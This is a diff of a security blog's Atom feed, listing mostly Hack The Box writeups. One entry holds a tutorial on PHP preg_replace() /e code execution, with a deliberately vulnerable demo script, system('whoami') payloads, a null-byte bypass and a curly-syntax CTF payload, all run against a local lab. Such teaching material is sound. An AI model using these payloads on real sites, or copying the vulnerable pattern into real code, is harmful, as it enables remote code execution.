@@ -3,11 +3,11 @@
   <title>Ikonw</title>
   
   
-  <link href="http://example.com/atom.xml" rel="self"/>
+  <link href="https://ik0nw.github.io/atom.xml" rel="self"/>
   
-  <link href="http://example.com/"/>
+  <link href="https://ik0nw.github.io/"/>
   <updated>2023-11-30T12:36:08.742Z</updated>
-  <id>http://example.com/</id>
+  <id>https://ik0nw.github.io/</id>
   
   <author>
     <name>Ikonw</name>
@@ -18,8 +18,8 @@
   
   <entry>
     <title>HTB Codify (Password protected)</title>
-    <link href="http://example.com/2023/11/30/HTB-Codify/"/>
-    <id>http://example.com/2023/11/30/HTB-Codify/</id>
+    <link href="https://ik0nw.github.io/2023/11/30/HTB-Codify/"/>
+    <id>https://ik0nw.github.io/2023/11/30/HTB-Codify/</id>
     <published>2023-11-29T16:00:00.000Z</published>
     <updated>2023-11-30T12:36:08.742Z</updated>
     
@@ -31,18 +31,18 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="easy" scheme="http://example.com/tags/easy/"/>
+    <category term="easy" scheme="https://ik0nw.github.io/tags/easy/"/>
     
-    <category term="linux" scheme="http://example.com/tags/linux/"/>
+    <category term="linux" scheme="https://ik0nw.github.io/tags/linux/"/>
     
   </entry>
   
   <entry>
     <title>HTB Devvortex (Password protected)</title>
-    <link href="http://example.com/2023/11/29/HTB-Devvortex/"/>
-    <id>http://example.com/2023/11/29/HTB-Devvortex/</id>
+    <link href="https://ik0nw.github.io/2023/11/29/HTB-Devvortex/"/>
+    <id>https://ik0nw.github.io/2023/11/29/HTB-Devvortex/</id>
     <published>2023-11-28T16:00:00.000Z</published>
     <updated>2023-11-29T12:23:33.966Z</updated>
     
@@ -53,38 +53,21 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
-    <category term="Linux" scheme="http://example.com/categories/hackthebox/Linux/"/>
+    <category term="Linux" scheme="https://ik0nw.github.io/categories/hackthebox/Linux/"/>
     
-    <category term="Easy" scheme="http://example.com/categories/hackthebox/Linux/Easy/"/>
-    
-    
-    <category term="Joomla" scheme="http://example.com/tags/Joomla/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HTB-Napper</title>
-    <link href="http://example.com/2023/11/29/HTB-Napper/"/>
-    <id>http://example.com/2023/11/29/HTB-Napper/</id>
-    <published>2023-11-28T16:00:00.000Z</published>
-    <updated>2023-11-30T10:25:06.525Z</updated>
-    
-    <content type="html"><![CDATA[<p>Hack the Box Napper writeup</p><span id="more"></span><p>This part of the content will only appear on the individual post’s page.</p>]]></content>
+    <category term="Easy" scheme="https://ik0nw.github.io/categories/hackthebox/Linux/Easy/"/>
     
     
-    <summary type="html">&lt;p&gt;Hack the Box Napper writeup&lt;/p&gt;</summary>
-    
-    
-    
+    <category term="Joomla" scheme="https://ik0nw.github.io/tags/Joomla/"/>
     
   </entry>
   
   <entry>
     <title>HTB Analytical writeup (Password protected)</title>
-    <link href="http://example.com/2023/10/15/HTB-Analytical/"/>
-    <id>http://example.com/2023/10/15/HTB-Analytical/</id>
+    <link href="https://ik0nw.github.io/2023/10/15/HTB-Analytical/"/>
+    <id>https://ik0nw.github.io/2023/10/15/HTB-Analytical/</id>
     <published>2023-10-15T00:00:00.000Z</published>
     <updated>2023-10-15T10:22:44.138Z</updated>
     
@@ -95,21 +78,21 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
-    <category term="Linux" scheme="http://example.com/categories/hackthebox/Linux/"/>
+    <category term="Linux" scheme="https://ik0nw.github.io/categories/hackthebox/Linux/"/>
     
-    <category term="Easy" scheme="http://example.com/categories/hackthebox/Linux/Easy/"/>
+    <category term="Easy" scheme="https://ik0nw.github.io/categories/hackthebox/Linux/Easy/"/>
     
     
-    <category term="command-injection" scheme="http://example.com/tags/command-injection/"/>
+    <category term="command-injection" scheme="https://ik0nw.github.io/tags/command-injection/"/>
     
   </entry>
   
   <entry>
     <title>HTB CozyHosting writeup (Password protected)</title>
-    <link href="http://example.com/2023/10/15/HTB-Cozyhosting/"/>
-    <id>http://example.com/2023/10/15/HTB-Cozyhosting/</id>
+    <link href="https://ik0nw.github.io/2023/10/15/HTB-Cozyhosting/"/>
+    <id>https://ik0nw.github.io/2023/10/15/HTB-Cozyhosting/</id>
     <published>2023-10-15T00:00:00.000Z</published>
     <updated>2023-10-15T09:34:13.897Z</updated>
     
@@ -120,21 +103,21 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
-    <category term="Linux" scheme="http://example.com/categories/hackthebox/Linux/"/>
+    <category term="Linux" scheme="https://ik0nw.github.io/categories/hackthebox/Linux/"/>
     
-    <category term="Easy" scheme="http://example.com/categories/hackthebox/Linux/Easy/"/>
+    <category term="Easy" scheme="https://ik0nw.github.io/categories/hackthebox/Linux/Easy/"/>
     
     
-    <category term="command-injection" scheme="http://example.com/tags/command-injection/"/>
+    <category term="command-injection" scheme="https://ik0nw.github.io/tags/command-injection/"/>
     
   </entry>
   
   <entry>
     <title>OSEP REVIEW</title>
-    <link href="http://example.com/2022/04/12/osep_review/"/>
-    <id>http://example.com/2022/04/12/osep_review/</id>
+    <link href="https://ik0nw.github.io/2022/04/12/osep_review/"/>
+    <id>https://ik0nw.github.io/2022/04/12/osep_review/</id>
     <published>2022-04-11T16:00:00.000Z</published>
     <updated>2023-11-30T10:28:54.440Z</updated>
     
@@ -146,14 +129,14 @@
     
     
     
-    <category term="offsec" scheme="http://example.com/tags/offsec/"/>
+    <category term="offsec" scheme="https://ik0nw.github.io/tags/offsec/"/>
     
   </entry>
   
   <entry>
     <title>HTB Academy Writeup</title>
-    <link href="http://example.com/2020/11/13/HTB-Academy/"/>
-    <id>http://example.com/2020/11/13/HTB-Academy/</id>
+    <link href="https://ik0nw.github.io/2020/11/13/HTB-Academy/"/>
+    <id>https://ik0nw.github.io/2020/11/13/HTB-Academy/</id>
     <published>2020-11-12T16:00:00.000Z</published>
     <updated>2023-11-30T10:29:10.879Z</updated>
     
@@ -164,19 +147,19 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="easy" scheme="http://example.com/tags/easy/"/>
+    <category term="easy" scheme="https://ik0nw.github.io/tags/easy/"/>
     
   </entry>
   
   <entry>
     <title>HTB Time Writeup</title>
-    <link href="http://example.com/2020/11/07/HTB-Time/"/>
-    <id>http://example.com/2020/11/07/HTB-Time/</id>
+    <link href="https://ik0nw.github.io/2020/11/07/HTB-Time/"/>
+    <id>https://ik0nw.github.io/2020/11/07/HTB-Time/</id>
     <published>2020-11-07T00:00:00.000Z</published>
     <updated>2023-11-30T10:17:47.858Z</updated>
     
@@ -187,19 +170,19 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="medium" scheme="http://example.com/tags/medium/"/>
+    <category term="medium" scheme="https://ik0nw.github.io/tags/medium/"/>
     
   </entry>
   
   <entry>
     <title>HTB Doctor Writeup</title>
-    <link href="http://example.com/2020/10/06/HTB-Doctor/"/>
-    <id>http://example.com/2020/10/06/HTB-Doctor/</id>
+    <link href="https://ik0nw.github.io/2020/10/06/HTB-Doctor/"/>
+    <id>https://ik0nw.github.io/2020/10/06/HTB-Doctor/</id>
     <published>2020-10-06T00:00:00.000Z</published>
     <updated>2023-11-29T13:14:44.109Z</updated>
     
@@ -210,19 +193,19 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="easy" scheme="http://example.com/tags/easy/"/>
+    <category term="easy" scheme="https://ik0nw.github.io/tags/easy/"/>
     
   </entry>
   
   <entry>
     <title>PHP::in_array() Type Juggling</title>
-    <link href="http://example.com/2020/09/25/PHP^%^%in_array()-Type%20Juggling/"/>
-    <id>http://example.com/2020/09/25/PHP^%^%in_array()-Type%20Juggling/</id>
+    <link href="https://ik0nw.github.io/2020/09/25/PHP^%^%in_array()-Type%20Juggling/"/>
+    <id>https://ik0nw.github.io/2020/09/25/PHP^%^%in_array()-Type%20Juggling/</id>
     <published>2020-09-25T00:00:00.000Z</published>
     <updated>2020-09-25T10:07:41.394Z</updated>
     
@@ -233,19 +216,19 @@
     
     
     
-    <category term="php-audit" scheme="http://example.com/categories/php-audit/"/>
+    <category term="php-audit" scheme="https://ik0nw.github.io/categories/php-audit/"/>
     
     
-    <category term="PHP,in_array(),type-juggling" scheme="http://example.com/tags/PHP-in-array-type-juggling/"/>
+    <category term="PHP,in_array(),type-juggling" scheme="https://ik0nw.github.io/tags/PHP-in-array-type-juggling/"/>
     
   </entry>
   
   <entry>
     <title>PHP::Preg_replace() RCE</title>
-    <link href="http://example.com/2020/09/23/PHP^%^%Preg_replace()-RCE/"/>
-    <id>http://example.com/2020/09/23/PHP^%^%Preg_replace()-RCE/</id>
+    <link href="https://ik0nw.github.io/2020/09/23/PHP^%^%Preg_replace()-RCE/"/>
+    <id>https://ik0nw.github.io/2020/09/23/PHP^%^%Preg_replace()-RCE/</id>
     <published>2020-09-23T00:00:00.000Z</published>
-    <updated>2021-10-10T03:30:33.227Z</updated>
+    <updated>2023-12-11T06:31:51.248Z</updated>
     
     <content type="html"><![CDATA[<p>PHP dangerous function preg_replace() leads to remote code execution with improper implementation</p><span id="more"></span><h1 id="Preg-replace"><a href="#Preg-replace" class="headerlink" title="Preg_replace"></a>Preg_replace</h1><p>preg_replace — Perform a regular expression search and replace</p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>preg_replace ( <a href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$pattern</code> , <a href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$replacement</code> , <a href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$subject</code> [, int <code>$limit</code> &#x3D; -1 [, int <code>&amp;$count</code> ]] ) : <a href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a></p></blockquote><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>All the testing will be test under docker environment with php version 5.3</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name app -d -p 8080:80 -v $(<span class="built_in">pwd</span>):/var/www/app romeoz/docker-apache-php:5.3</span><br></pre></td></tr></table></figure><p>put all your php files under the same directory with the docker file.</p><p>Access the page in localhost port 8080</p><h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(patterns, replacements, input, limit, count)</span><br></pre></td></tr></table></figure><p>Searches <code>subject</code> for matches to <code>pattern</code> and replaces them with <code>replacement</code>.</p><p>The normal use of <code>Preg_replace()</code> is safe enough for replacing pattern using regex </p><p>Let see a example:</p><p>When we want to filter unwanted words from user input and replace it with proper words</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$input</span> = <span class="string">&quot;eat my shit please&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pattern&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;replacement&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">                <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;replacement&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$input</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$input</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The <code>/i</code> modifier will match both upper and lower case letters.</p><p>we expect the output to be <code>eat my shit please</code> without any parameter</p><p>But what if we want to change the <code>shit</code> to <code>poo</code> instead ?</p><p><img src="/images/PHP-preg_replace()/image-20200923173920509.png" alt="image-20200923173920509"></p><p>And we filter off bad words. Everything seems fine with this function</p><p>The danger comes in when the modifier set to <code>/e</code> instead of <code>/i</code>, it will cause PHP to execute the replacement value as code.</p><p><img src="/images/PHP-preg_replace()/image-20200923175756261.png" alt="image-20200923175756261"></p><p>the <code>preg_replace()</code> has come <code>preg_replace(&#39;/shit/e&#39;,&#39;system(&#39;whoami&#39;),&quot;eat my shit please&quot;)</code></p><p>The string <code>shit</code> trigger the replace function to execute a <code>system(&#39;whoami&#39;)</code></p><h2 id="Null-byte-bypass"><a href="#Null-byte-bypass" class="headerlink" title="Null byte  bypass"></a>Null byte  bypass</h2><p>Let’s look at the another example if we are not able to control the delimiter </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$input</span> = <span class="string">&quot;eat my shit please&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pattern&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;replacement&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">                <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;replacement&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$input</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$input</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>pattern</code> parameter no longer require the <code>/</code> and delimiter</p><p><img src="/images/PHP-preg_replace()/image-20200923180446620.png" alt="image-20200923180446620"></p><p><img src="/images/PHP-preg_replace()/image-20200923180618692.png" alt="image-20200923180618692"></p><p>This code seems safe, attacker can no longer end the regular expression with their own modifier.</p><p>Do take note <code>PHP</code> take some of the syntax from <code>C</code> . In C, it handles strings as a character array, it needs a way to define the last character of the string. This is done using a null byte. A null byte is denoted by <code>\0</code> in C. <code>preg_replace</code> function handle an input string as they handled by C.</p><p>Therefore, we can input a <code>\0</code> which is <code>%00</code> in URL to control the last character of the string.</p><p><img src="/images/PHP-preg_replace()/image-20200923181534025.png" alt="image-20200923181534025"></p><h2 id="CTF-challenge"><a href="#CTF-challenge" class="headerlink" title="CTF challenge"></a>CTF challenge</h2><p>CTF challenge from <a href="https://www.ripstech.com/php-security-calendar-2017/">PHP SECURITY CALENDAR</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> complexStrtolower(<span class="variable">$regex</span>, <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="built_in">return</span> preg_replace(</span><br><span class="line">    <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">    <span class="variable">$value</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach (<span class="variable">$_GET</span> as <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="built_in">echo</span> complexStrtolower(<span class="variable">$regex</span>, <span class="variable">$value</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can use PHP’s curly syntax to inject the function call</p><p><a href="https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">Complex (curly) syntax</a></p><p><code>http://localhost:8080/challenges.php/?\S*=&#123;$&#123;system(id)&#125;&#125;</code></p><p>The reason why we are using curly syntax is because after the function <code>complexStrtolower</code> we are storing our result into <code>&quot;&lt;result&gt;&quot;</code> in double quotes</p><p>In PHP, the variable in double quotes are allow to parse as variable.</p><p>In curly syntax, single curly braces is for parsing variable.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Works, outputs: This is fantastic</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is <span class="subst">&#123;$great&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p><strong>Note</strong>:</p><p>Functions, method calls, static class variables, and class constants inside <code>&#123;$&#125;</code> work since PHP 5. However, the value accessed will be interpreted as the name of a variable in the scope in which the string is defined. Using single curly braces (<code>&#123;&#125;</code>) will not work for accessing the return values of functions or methods or the values of class constants or static class variables.</p></blockquote><p>For functions we have to use double curly braces. E.g. <code>&#123;$&#123;phpinfo()&#125;&#125;</code></p><h2 id="Another-question"><a href="#Another-question" class="headerlink" title="Another question"></a>Another question</h2><p>why we are able to execute <code>system(id)</code> without quote the <code>&#39;id&#39;</code></p><p><img src="/images/PHP-preg_replace()/image-20200923195620695.png" alt="image-20200923195620695"></p><p>if we add <code>id</code> in single quotes, it will auto add a slash to escape the single quotes (Which I have no idea ??? Comment if you know the reason)</p><p>however, in PHP. Constants without quote will assume as string beacuse of the PHP ‘loosely typed’ characterstic (Will be discover more on later post <code>PHP type juggling</code>)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(whoami);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/PHP-preg_replace()/image-20200923200156085.png" alt="image-20200923200156085"></p><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul><li><a href="https://infosecabsurdity.wordpress.com/2012/12/17/phpwcms-remote-code-execution-and-php-pcre-filter-evasion-bypasses-zeroday/">https://infosecabsurdity.wordpress.com/2012/12/17/phpwcms-remote-code-execution-and-php-pcre-filter-evasion-bypasses-zeroday/</a></li><li><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></li><li><a href="http://www.madirish.net/402">http://www.madirish.net/402</a></li></ul>]]></content>
     
@@ -254,17 +237,17 @@
     
     
     
-    <category term="php-audit" scheme="http://example.com/categories/php-audit/"/>
+    <category term="php-audit" scheme="https://ik0nw.github.io/categories/php-audit/"/>
     
     
-    <category term="PHP,preg_replace()" scheme="http://example.com/tags/PHP-preg-replace/"/>
+    <category term="PHP,preg_replace()" scheme="https://ik0nw.github.io/tags/PHP-preg-replace/"/>
     
   </entry>
   
   <entry>
     <title>HTB Jet Fortress writeup</title>
-    <link href="http://example.com/2020/09/21/HTB-fortress-Jet/"/>
-    <id>http://example.com/2020/09/21/HTB-fortress-Jet/</id>
+    <link href="https://ik0nw.github.io/2020/09/21/HTB-fortress-Jet/"/>
+    <id>https://ik0nw.github.io/2020/09/21/HTB-fortress-Jet/</id>
     <published>2020-09-20T16:00:00.000Z</published>
     <updated>2023-11-29T13:14:43.566Z</updated>
     
@@ -275,27 +258,27 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
-    <category term="fortress" scheme="http://example.com/categories/hackthebox/fortress/"/>
+    <category term="fortress" scheme="https://ik0nw.github.io/categories/hackthebox/fortress/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="fortress" scheme="http://example.com/tags/fortress/"/>
+    <category term="fortress" scheme="https://ik0nw.github.io/tags/fortress/"/>
     
-    <category term="enumeration" scheme="http://example.com/tags/enumeration/"/>
+    <category term="enumeration" scheme="https://ik0nw.github.io/tags/enumeration/"/>
     
-    <category term="dns enumeration" scheme="http://example.com/tags/dns-enumeration/"/>
+    <category term="dns enumeration" scheme="https://ik0nw.github.io/tags/dns-enumeration/"/>
     
-    <category term="dig" scheme="http://example.com/tags/dig/"/>
+    <category term="dig" scheme="https://ik0nw.github.io/tags/dig/"/>
     
   </entry>
   
   <entry>
     <title>HTB Akerva Fortress writeup (Password protected)</title>
-    <link href="http://example.com/2020/09/19/HTB-fortress-akerva/"/>
-    <id>http://example.com/2020/09/19/HTB-fortress-akerva/</id>
+    <link href="https://ik0nw.github.io/2020/09/19/HTB-fortress-akerva/"/>
+    <id>https://ik0nw.github.io/2020/09/19/HTB-fortress-akerva/</id>
     <published>2020-09-19T00:22:26.000Z</published>
     <updated>2020-11-14T07:12:52.098Z</updated>
     
@@ -306,27 +289,27 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
-    <category term="fortress" scheme="http://example.com/categories/hackthebox/fortress/"/>
+    <category term="fortress" scheme="https://ik0nw.github.io/categories/hackthebox/fortress/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="fortress" scheme="http://example.com/tags/fortress/"/>
+    <category term="fortress" scheme="https://ik0nw.github.io/tags/fortress/"/>
     
-    <category term="enumeration" scheme="http://example.com/tags/enumeration/"/>
+    <category term="enumeration" scheme="https://ik0nw.github.io/tags/enumeration/"/>
     
-    <category term="cve" scheme="http://example.com/tags/cve/"/>
+    <category term="cve" scheme="https://ik0nw.github.io/tags/cve/"/>
     
-    <category term="scripting" scheme="http://example.com/tags/scripting/"/>
+    <category term="scripting" scheme="https://ik0nw.github.io/tags/scripting/"/>
     
   </entry>
   
   <entry>
     <title>HTB Compromised Writeup</title>
-    <link href="http://example.com/2020/09/17/HTB-Compromised/"/>
-    <id>http://example.com/2020/09/17/HTB-Compromised/</id>
+    <link href="https://ik0nw.github.io/2020/09/17/HTB-Compromised/"/>
+    <id>https://ik0nw.github.io/2020/09/17/HTB-Compromised/</id>
     <published>2020-09-16T23:28:25.000Z</published>
     <updated>2021-10-10T03:29:41.591Z</updated>
     
@@ -337,21 +320,21 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="reverse" scheme="http://example.com/tags/reverse/"/>
+    <category term="reverse" scheme="https://ik0nw.github.io/tags/reverse/"/>
     
-    <category term="mysql exec_cmd" scheme="http://example.com/tags/mysql-exec-cmd/"/>
+    <category term="mysql exec_cmd" scheme="https://ik0nw.github.io/tags/mysql-exec-cmd/"/>
     
   </entry>
   
   <entry>
     <title>HTB::Challenge [Mobile] Cat</title>
-    <link href="http://example.com/2020/09/11/Challenge-Cat/"/>
-    <id>http://example.com/2020/09/11/Challenge-Cat/</id>
+    <link href="https://ik0nw.github.io/2020/09/11/Challenge-Cat/"/>
+    <id>https://ik0nw.github.io/2020/09/11/Challenge-Cat/</id>
     <published>2020-09-10T21:38:37.000Z</published>
     <updated>2020-09-20T06:44:15.280Z</updated>
     
@@ -362,19 +345,19 @@
     
     
     
-    <category term="hackthebox-challenge" scheme="http://example.com/categories/hackthebox-challenge/"/>
+    <category term="hackthebox-challenge" scheme="https://ik0nw.github.io/categories/hackthebox-challenge/"/>
     
-    <category term="mobile" scheme="http://example.com/categories/hackthebox-challenge/mobile/"/>
+    <category term="mobile" scheme="https://ik0nw.github.io/categories/hackthebox-challenge/mobile/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
   </entry>
   
   <entry>
     <title>HTB Passage Writeup</title>
-    <link href="http://example.com/2020/09/06/HTB-Passage/"/>
-    <id>http://example.com/2020/09/06/HTB-Passage/</id>
+    <link href="https://ik0nw.github.io/2020/09/06/HTB-Passage/"/>
+    <id>https://ik0nw.github.io/2020/09/06/HTB-Passage/</id>
     <published>2020-09-05T21:22:53.000Z</published>
     <updated>2021-10-10T03:29:44.531Z</updated>
     
@@ -385,19 +368,19 @@
     
     
     
-    <category term="hackthebox" scheme="http://example.com/categories/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/categories/hackthebox/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="medium" scheme="http://example.com/tags/medium/"/>
+    <category term="medium" scheme="https://ik0nw.github.io/tags/medium/"/>
     
   </entry>
   
   <entry>
     <title>GitTalk 404 error</title>
-    <link href="http://example.com/2020/09/05/git_talk/"/>
-    <id>http://example.com/2020/09/05/git_talk/</id>
+    <link href="https://ik0nw.github.io/2020/09/05/git_talk/"/>
+    <id>https://ik0nw.github.io/2020/09/05/git_talk/</id>
     <published>2020-09-05T00:00:00.000Z</published>
     <updated>2020-09-24T13:54:11.451Z</updated>
     
@@ -409,14 +392,14 @@
     
     
     
-    <category term="gitalk" scheme="http://example.com/tags/gitalk/"/>
+    <category term="gitalk" scheme="https://ik0nw.github.io/tags/gitalk/"/>
     
   </entry>
   
   <entry>
     <title>HTB Feline Writeup</title>
-    <link href="http://example.com/2020/08/30/HTB-Feline/"/>
-    <id>http://example.com/2020/08/30/HTB-Feline/</id>
+    <link href="https://ik0nw.github.io/2020/08/30/HTB-Feline/"/>
+    <id>https://ik0nw.github.io/2020/08/30/HTB-Feline/</id>
     <published>2020-08-30T00:00:00.000Z</published>
     <updated>2021-10-10T03:29:47.419Z</updated>
     
@@ -427,19 +410,19 @@
     
     
     
-    <category term="HackTheBox-Hard" scheme="http://example.com/categories/HackTheBox-Hard/"/>
+    <category term="HackTheBox-Hard" scheme="https://ik0nw.github.io/categories/HackTheBox-Hard/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
     
-    <category term="hard" scheme="http://example.com/tags/hard/"/>
+    <category term="hard" scheme="https://ik0nw.github.io/tags/hard/"/>
     
   </entry>
   
   <entry>
     <title>Defcon DFIR memory forensic CTF 2019</title>
-    <link href="http://example.com/2020/08/22/Defcon-DFIR-memory_forensic/"/>
-    <id>http://example.com/2020/08/22/Defcon-DFIR-memory_forensic/</id>
+    <link href="https://ik0nw.github.io/2020/08/22/Defcon-DFIR-memory_forensic/"/>
+    <id>https://ik0nw.github.io/2020/08/22/Defcon-DFIR-memory_forensic/</id>
     <published>2020-08-22T00:00:00.000Z</published>
     <updated>2020-09-20T06:49:56.604Z</updated>
     
@@ -450,17 +433,17 @@
     
     
     
-    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
+    <category term="CTF" scheme="https://ik0nw.github.io/categories/CTF/"/>
     
     
-    <category term="forensic" scheme="http://example.com/tags/forensic/"/>
+    <category term="forensic" scheme="https://ik0nw.github.io/tags/forensic/"/>
     
   </entry>
   
   <entry>
     <title>HTB::Challenge [Misc] G0ld</title>
-    <link href="http://example.com/2020/08/15/Challenge-G0ld/"/>
-    <id>http://example.com/2020/08/15/Challenge-G0ld/</id>
+    <link href="https://ik0nw.github.io/2020/08/15/Challenge-G0ld/"/>
+    <id>https://ik0nw.github.io/2020/08/15/Challenge-G0ld/</id>
     <published>2020-08-14T22:29:33.000Z</published>
     <updated>2020-09-20T06:50:00.784Z</updated>
     
@@ -471,12 +454,35 @@
     
     
     
-    <category term="hackthebox-challenge" scheme="http://example.com/categories/hackthebox-challenge/"/>
+    <category term="hackthebox-challenge" scheme="https://ik0nw.github.io/categories/hackthebox-challenge/"/>
     
-    <category term="misc" scheme="http://example.com/categories/hackthebox-challenge/misc/"/>
+    <category term="misc" scheme="https://ik0nw.github.io/categories/hackthebox-challenge/misc/"/>
     
     
-    <category term="hackthebox" scheme="http://example.com/tags/hackthebox/"/>
+    <category term="hackthebox" scheme="https://ik0nw.github.io/tags/hackthebox/"/>
